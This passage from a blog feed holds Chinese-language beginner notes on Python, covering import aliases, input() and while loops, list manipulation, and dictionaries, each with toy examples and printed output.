href="#使用as来给函数指定别名" class="headerlink" title="使用as来给函数指定别名"></a>使用as来给函数指定别名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pizza import making_pizza as mp</span><br><span class="line">mp(16,&#x27;pepperont&#x27;)</span><br><span class="line">mp(21,&#x27;cheese&#x27;,&#x27;huge&#x27;,&#x27;mushrooms&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">making a 16 pizza whit the following topping</span><br><span class="line">-pepperont</span><br><span class="line">making a 21 pizza whit the following topping</span><br><span class="line">-cheese</span><br><span class="line">-huge</span><br><span class="line">-mushrooms</span><br></pre></td></tr></table></figure><h6 id="使用as给模块指定别名"><a href="#使用as给模块指定别名" class="headerlink" title="使用as给模块指定别名"></a>使用as给模块指定别名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pizza as p</span><br><span class="line">p.making_pizza(16,&#x27;pepperont&#x27;)</span><br><span class="line">p.making_pizza(21,&#x27;cheese&#x27;,&#x27;huge&#x27;,&#x27;mushrooms&#x27;)</span><br></pre></td></tr></table></figure><p>结果是一样的</p><h6 id="导入模块中的所有函数"><a href="#导入模块中的所有函数" class="headerlink" title="导入模块中的所有函数"></a>导入模块中的所有函数</h6><p>使用星号（*）可以让Python导入模块中的所有函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pizza import *</span><br><span class="line">making_pizza(16,&#x27;pepperont&#x27;)</span><br><span class="line">making_pizza(21,&#x27;cheese&#x27;,&#x27;huge&#x27;,&#x27;mushrooms&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">making a 16 pizza whit the following topping</span><br><span class="line">-pepperont</span><br><span class="line">making a 21 pizza whit the following topping</span><br><span class="line">-cheese</span><br><span class="line">-huge</span><br><span class="line">-mushrooms</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python--从入门到入土--用户输入和while循环</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8825%E6%97%A5-Python-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E5%92%8Cwhile%E5%BE%AA%E7%8E%AF/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8825%E6%97%A5-Python-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E5%92%8Cwhile%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<h6 id="函数input"><a href="#函数input" class="headerlink" title="函数input()"></a>函数input()</h6><p>函数input()使程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其赋给一个变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">message=input(&quot;tell me something and i will repeat:&quot;)</span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure><p>实际上上面那个表达式中input里面的“”以及里面的东西不加也是可以的0_o</p><h6 id="int（）"><a href="#int（）" class="headerlink" title="int（）"></a>int（）</h6><p>int 只能用来将input输入的数转换成数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from builtins import int, print</span><br><span class="line"></span><br><span class="line">age = int(input(&#x27;age=&#x27;))</span><br><span class="line">print(age)</span><br><span class="line">result=bool(age &gt;= 18)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age=19//19是我输入的</span><br><span class="line">19</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h6 id="求模运算符"><a href="#求模运算符" class="headerlink" title="求模运算符"></a>求模运算符</h6><p>%，不解释</p><h6 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h6><p>形式和C的差不多，但就是不用（）以及：的事情</p><h6 id="使用标签"><a href="#使用标签" class="headerlink" title="使用标签"></a>使用标签</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from builtins import int, print</span><br><span class="line"></span><br><span class="line">prompt = &quot;\nabaxiba好吧其实我可以将你输入的话输出除非你输入quit\n&quot;</span><br><span class="line">activity = True</span><br><span class="line">while activity:</span><br><span class="line">    message = input(prompt)</span><br><span class="line">    if message == &#x27;quit&#x27;:</span><br><span class="line">        activity = False</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br></pre></td></tr></table></figure><p>break中断当前循环</p><p>continue是跳出当前循环</p><h6 id="转移列表元素"><a href="#转移列表元素" class="headerlink" title="转移列表元素"></a>转移列表元素</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">unconfired_users = [&#x27;alice&#x27;,&#x27;bobo&#x27;,&#x27;ctf&#x27;]#定义一个列表</span><br><span class="line">confirmed_users = []#定义一个空列表</span><br><span class="line">while unconfired_users:#while循环</span><br><span class="line">    current_user = unconfired_users.pop()#定义一个变量使之等于unconfired_users最后删除的值</span><br><span class="line">    print(f&quot;verifying user:&#123;current_user.title()&#125;&quot;)#输出current_user的值</span><br><span class="line">    confirmed_users.append(current_user)#将current_user的值添加到空列表中</span><br><span class="line"></span><br><span class="line">print(&#x27;\nthe following users have been confirmed&#x27;)#输出一个标题</span><br><span class="line">for confirmed_user in confirmed_users:#遍历confirmed_users这个列表</span><br><span class="line">        print(confirmed_user)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">verifying user:Ctf</span><br><span class="line">verifying user:Bobo</span><br><span class="line">verifying user:Alice</span><br><span class="line"></span><br><span class="line">the following users have been confirmed</span><br><span class="line">ctf</span><br><span class="line">bobo</span><br><span class="line">alice</span><br></pre></td></tr></table></figure><p>这样就讲一个列表中的元素全部转移到另一个列表中了</p><h6 id="删除特定值的列表元素"><a href="#删除特定值的列表元素" class="headerlink" title="删除特定值的列表元素"></a>删除特定值的列表元素</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pets = [&#x27;cat&#x27;,&#x27;dog&#x27;,&#x27;lion&#x27;,&#x27;tiger&#x27;,&#x27;dargon&#x27;,&#x27;goldfish&#x27;,&#x27;fish&#x27;]</span><br><span class="line">print(pets)</span><br><span class="line"></span><br><span class="line">while &#x27;goldfish&#x27; in pets:</span><br><span class="line">    pets.remove(&#x27;goldfish&#x27;)</span><br><span class="line">print(pets)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;cat&#x27;, &#x27;dog&#x27;, &#x27;lion&#x27;, &#x27;tiger&#x27;, &#x27;dargon&#x27;, &#x27;goldfish&#x27;, &#x27;fish&#x27;]</span><br><span class="line">[&#x27;cat&#x27;, &#x27;dog&#x27;, &#x27;lion&#x27;, &#x27;tiger&#x27;, &#x27;dargon&#x27;, &#x27;fish&#x27;]</span><br></pre></td></tr></table></figure><h5 id="这里有一个问题"><a href="#这里有一个问题" class="headerlink" title="这里有一个问题"></a>这里有一个问题</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pets = [&#x27;cat&#x27;,&#x27;dog&#x27;,&#x27;lion&#x27;,&#x27;tiger&#x27;,&#x27;dargon&#x27;,&#x27;goldfish&#x27;,&#x27;fish&#x27;]</span><br><span class="line">print(pets)</span><br><span class="line">pet = [&#x27;fish&#x27;,&#x27;goldfish&#x27;]</span><br><span class="line">for pet in pets:</span><br><span class="line">    pets.remove(pet)</span><br><span class="line">print(pets)</span><br></pre></td></tr></table></figure><h6 id="使用用户输入填充字典中的元素"><a href="#使用用户输入填充字典中的元素" class="headerlink" title="使用用户输入填充字典中的元素"></a>使用用户输入填充字典中的元素</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">response = &#123;&#125;</span><br><span class="line">polling_active = True</span><br><span class="line">while polling_active:</span><br><span class="line">    name = input(&quot;姓名：&quot;)</span><br><span class="line">    responses = input(&quot;回答：&quot;)</span><br><span class="line">    response[name] = responses</span><br><span class="line">    repeat = input(&#x27;whether you want to answer more?yes/no&#x27;)</span><br><span class="line">    if repeat == &#x27;no&#x27;:</span><br><span class="line">        polling_active = False</span><br><span class="line">print(&quot;----Polling-----&quot;)</span><br><span class="line">for name,responses in response.items():</span><br><span class="line">    print(f&quot;&#123;name&#125;:回答是&#123;response&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">姓名：a</span><br><span class="line">回答：s</span><br><span class="line">whether you want to answer more?yes/nono</span><br><span class="line">----Polling-----</span><br><span class="line">a:回答是&#123;&#x27;a&#x27;: &#x27;s&#x27;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python--从入门到入土--字典</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8824%E6%97%A5-Python-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%AD%97%E5%85%B8/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8824%E6%97%A5-Python-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;points&#x27;:5&#125;</span><br><span class="line">print(alien_0[&#x27;color&#x27;])</span><br><span class="line">print(alien_0[&#x27;points&#x27;])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">green</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h6 id="这就是一个简单的字典"><a href="#这就是一个简单的字典" class="headerlink" title="这就是一个简单的字典"></a>这就是一个简单的字典</h6><p>在Python中，字典是一系列键值对。每个键都有一个值相互关联</p><h6 id="访问字典中的值"><a href="#访问字典中的值" class="headerlink" title="访问字典中的值"></a>访问字典中的值</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;points&#x27;:5&#125;</span><br><span class="line">new_point=alien_0[&#x27;points&#x27;]</span><br><span class="line">print(f&quot;you have killed &#123;new_point&#125; alien&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you have killed 5alien</span><br></pre></td></tr></table></figure><h6 id="添加键值对"><a href="#添加键值对" class="headerlink" title="添加键值对"></a>添加键值对</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;points&#x27;:5&#125;</span><br><span class="line">print(alien_0)</span><br><span class="line">alien_0[&#x27;x_position&#x27;]=0</span><br><span class="line">alien_0[&#x27;y_position&#x27;]=0</span><br><span class="line">print(alien_0)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;points&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;points&#x27;: 5, &#x27;x_position&#x27;: 0, &#x27;y_position&#x27;: 0&#125;</span><br></pre></td></tr></table></figure><h6 id="修改字典中的值"><a href="#修改字典中的值" class="headerlink" title="修改字典中的值"></a>修改字典中的值</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alien_0=&#123;&#x27;color&#x27;:&#x27;green&#x27;&#125;</span><br><span class="line">print(alien_0)</span><br><span class="line">alien_0[&#x27;color&#x27;]=&#x27;yellow&#x27;</span><br><span class="line">print(f&quot;now it&#x27;s &#123;alien_0&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;&#125;</span><br><span class="line">now it&#x27;s &#123;&#x27;color&#x27;: &#x27;yellow&#x27;&#125;</span><br></pre></td></tr></table></figure><h6 id="删除字典中的键值对"><a href="#删除字典中的键值对" class="headerlink" title="删除字典中的键值对"></a>删除字典中的键值对</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alien_0=&#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;point&#x27;:5&#125;</span><br><span class="line">print(alien_0)</span><br><span class="line">del alien_0[&#x27;color&#x27;]</span><br><span class="line">print(alien_0)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;point&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;point&#x27;: 5&#125;</span><br></pre></td></tr></table></figure><h6 id="来一个大家伙"><a href="#来一个大家伙" class="headerlink" title="来一个大家伙"></a>来一个大家伙</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">favorite_language =&#123;</span><br><span class="line">&#x27;edward&#x27;:&#x27;rudy&#x27;,</span><br><span class="line">&#x27;jen&#x27;:&#x27;python&#x27;,</span><br><span class="line">&#x27;phil&#x27;:&#x27;python&#x27;,</span><br><span class="line">&#x27;sarah&#x27;:&#x27;c&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">language = favorite_language[&#x27;sarah&#x27;].title()</span><br><span class="line">print(f&quot;sarah&#x27;s favorite language is &#123;language&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sarah&#x27;s favorite language is C</span><br></pre></td></tr></table></figure><h6 id="使用方法get来访问值"><a href="#使用方法get来访问值" class="headerlink" title="使用方法get来访问值"></a>使用方法get来访问值</h6><p>get（）方法的第一个参数用于指定值，第二个参数为指定的键不存在的时候要返回的值，可省略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;speed&#x27;:&#x27;slow&#x27;&#125;</span><br><span class="line">point_value = alien_0.get(&#x27;color&#x27;,&#x27;0_o&#x27;)</span><br><span class="line">print(point_value)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">green</span><br></pre></td></tr></table></figure><p>但是如果我换一个数值呢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;speed&#x27;:&#x27;slow&#x27;&#125;</span><br><span class="line">point_value = alien_0.get(&#x27;spend&#x27;,&#x27;0_o&#x27;)</span><br><span class="line">print(point_value)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0_o//(好一个杰西卡)</span><br></pre></td></tr></table></figure><h6 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user = &#123;</span><br><span class="line">&#x27;username&#x27;: &#x27;admin&#x27;,</span><br><span class="line">&#x27;first&#x27;:&#x27;enrico&#x27;,</span><br><span class="line">&#x27;last&#x27;:&#x27;fermi&#x27;</span><br><span class="line">&#125;</span><br><span class="line">for key,value in user.items():</span><br><span class="line">print(f&quot;\nkey:&#123;key&#125;&quot;)</span><br><span class="line">print(f&quot;vale:&#123;value&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key:username</span><br><span class="line">vale:admin</span><br><span class="line"></span><br><span class="line">key:first</span><br><span class="line">vale:enrico</span><br><span class="line"></span><br><span class="line">key:last</span><br><span class="line">vale:fermi</span><br></pre></td></tr></table></figure><p>这里不是使用keys()和values()方法，只是设了两个局部变量使得key=键，value等于值而已</p><p>item（）方法返回一个键值对列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    &#x27;edward&#x27;: &#x27;rudy&#x27;,</span><br><span class="line">    &#x27;jen&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;phil&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;sarah&#x27;: &#x27;c&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">friends = [&#x27;sarah&#x27;,&#x27;jen&#x27;]               //这里的“，”很关键，这是分隔开两个的，   如果没有的话会默认两个连接在一起输出</span><br><span class="line">for name in favorite_languages.keys():</span><br><span class="line">    print(f&quot;&#123;name.title()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    if name in friends:</span><br><span class="line">        language = favorite_languages[name].title()</span><br><span class="line">        print(f&quot;&#123;name.title()&#125;,i know you like &#123;language&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Edward</span><br><span class="line">Jen</span><br><span class="line">Jen,i know you like Python</span><br><span class="line">Phil</span><br><span class="line">Sarah</span><br><span class="line">Sarah,i know you like C</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>key()方法：返回一个字典所有的键。</p><h6 id="按照特定顺序来遍历字典中的所有键"><a href="#按照特定顺序来遍历字典中的所有键" class="headerlink" title="按照特定顺序来遍历字典中的所有键"></a>按照特定顺序来遍历字典中的所有键</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    &#x27;jen&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;phil&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;edward&#x27;: &#x27;rudy&#x27;,</span><br><span class="line">    &#x27;sarah&#x27;: &#x27;c&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">for name in sorted(favorite_languages.keys()):</span><br><span class="line">    print(f&quot;&#123;name.title()&#125;,thanks for you &quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Edward,thanks for you </span><br><span class="line">Jen,thanks for you </span><br><span class="line">Phil,thanks for you </span><br><span class="line">Sarah,thanks for you </span><br></pre></td></tr></table></figure><p>set()可以找出独一无二的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    &#x27;jen&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;phil&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;edward&#x27;: &#x27;rudy&#x27;,</span><br><span class="line">    &#x27;sarah&#x27;: &#x27;c&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">for language in set(favorite_languages.values()):</span><br><span class="line">    print(f&quot;&#123;language.title()&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rudy</span><br><span class="line">Python</span><br><span class="line">C</span><br></pre></td></tr></table></figure><p>keys() 方法用于返回字典中的所有键；values() 方法用于返回字典中所有键对应的值</p><h6 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alien_00=&#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;points&#x27;:5&#125;</span><br><span class="line">alien_01=&#123;&#x27;color&#x27;:&#x27;blue&#x27;,&#x27;points&#x27;:6&#125;</span><br><span class="line">alien_02=&#123;&#x27;color&#x27;:&#x27;red&#x27;,&#x27;points&#x27;:9&#125;</span><br><span class="line">alien_03=&#123;&#x27;color&#x27;:&#x27;yellow&#x27;,&#x27;points&#x27;:7&#125;</span><br><span class="line">aliens=[alien_00,alien_01,alien_02,alien_03]</span><br><span class="line">for alien in aliens:</span><br><span class="line">print(alien)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;points&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;blue&#x27;, &#x27;points&#x27;: 6&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;red&#x27;, &#x27;points&#x27;: 9&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;points&#x27;: 7&#125;</span><br></pre></td></tr></table></figure><p>大量使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">aliens = []</span><br><span class="line">for alien_number in range(20):</span><br><span class="line">new_alien = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;point&#x27;:5&#125;</span><br><span class="line">aliens.append(new_alien)</span><br><span class="line"></span><br><span class="line">for alien in aliens[:3]:</span><br><span class="line">if alien[&#x27;color&#x27;]==&#x27;green&#x27;:</span><br><span class="line">alien[&#x27;color&#x27;]=&#x27;yellow&#x27;</span><br><span class="line">alien[&#x27;point&#x27;]=&#x27;10&#x27;</span><br><span class="line">elif alien[&#x27;color&#x27;]==&#x27;yellow&#x27;:</span><br><span class="line">alien[&#x27;color&#x27;]=&#x27;red&#x27;</span><br><span class="line">alien[&#x27;point&#x27;]=&#x27;20&#x27;</span><br><span class="line">for alien in aliens[:5]:</span><br><span class="line">print(alien)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;point&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;point&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;point&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;point&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;point&#x27;: 5&#125;</span><br></pre></td></tr></table></figure><h6 id="在字典中存储列表"><a href="#在字典中存储列表" class="headerlink" title="在字典中存储列表"></a>在字典中存储列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pizza = &#123;</span><br><span class="line">&#x27;sort&#x27;:&#x27;好好好&#x27;,</span><br><span class="line">&#x27;materials&#x27;:[&#x27;好&#x27;,&#x27;好个寂寞好&#x27;],</span><br><span class="line">&#125;</span><br><span class="line">print(f&quot;you order a &#123;pizza[&#x27;sort&#x27;]&#125; pizza&quot;)</span><br><span class="line">for material in pizza[&#x27;materials&#x27;]:</span><br><span 